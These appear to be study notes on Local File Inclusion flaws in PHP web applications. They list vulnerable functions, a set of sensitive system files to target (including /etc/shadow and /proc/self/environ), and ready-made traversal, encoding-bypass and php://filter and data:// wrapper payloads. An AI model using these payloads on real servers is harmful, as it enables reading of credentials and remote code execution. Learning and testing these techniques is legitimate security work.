- An LFI vulnerability allows the attacker to include and read local files on the server, which could contain sensitive data.
- Occurs due to a developer's lack of security awareness, and lack of user input validation/sanitization.
- ## Risk
	- Sensitive data leakage.
	- LFI could be chained to perform Remote Code Execution (RCE) on the server.
- ## Identifying and Testing for LFI
	- HTTP parameters are used to manipulate parameters and inject attack payloads.
	- An HTTP GET/POST parameters that pass an argument or data to the web application to perform a specific operation.
	- After the entry point is found &uarr; we need to understand how this data could be processed within the application.
	- The following PHP functions could cause this kind of vulnerability
		- `include`
		- `require`
		- `include_once`
		- `require_once`
- Files that are useful to read after finding the vulnerability
	- `/etc/issue`
	- `/etc/passwd`
	- `/etc/shadow`
	- `/etc/group`
	- `/etc/hosts`
	- `/etc/motd`
	- `/etc/mysql/my.cnf`
	- `/proc/[0-9]*/fd/[0-9]* ` (first number is the PID, second is the file descriptor)
	- `/proc/self/environ`
	- `/proc/version`
	- `/proc/cmdline`
- ## Techniques
	- Direct File Inclusion, like `?file=/etc/passwd`.
	- Using `..` to get out of the current directory and traverse the other directories for data, like `?file=../../../../../../../etc/passwd`.
	- Adding a Null character like `?file=../../../../../../etc/passwd%00`.
	- Bypassing filter using `....//` like `?file=....//....//....//etc/passwd`.
	- URL encoding techniques like double encoding `?file=%252e%252e%252fetc%252fpasswd`.
	- Depending on the web application type, some wrappers can be used like PHP Filter and PHP DATA, like `?file=php://filter/resource=/etc/passwd`.
	- **PHP Filter**
		- To read PHP files using the above technique, some encoding could be required first using `base64` or `ROT13`, like `?file=php://filter/read=string.rot13/resource=/etc/passwd` and `?file=php://filter/convert.base64-encode/resource=/etc/passwd`, and afterwards decode the leaked data.
	- **PHP DATA**
		- Used to include raw plain text or `base64` encoded data. It is used to include images on the current page.
		- Encode the data using `echo <data> | base64` then use the encoded data inside the parameter `?file=data://text/plain;base64,<data>`.
		- Using this technique, we can encode PHP code and include it into PHP data wrapper.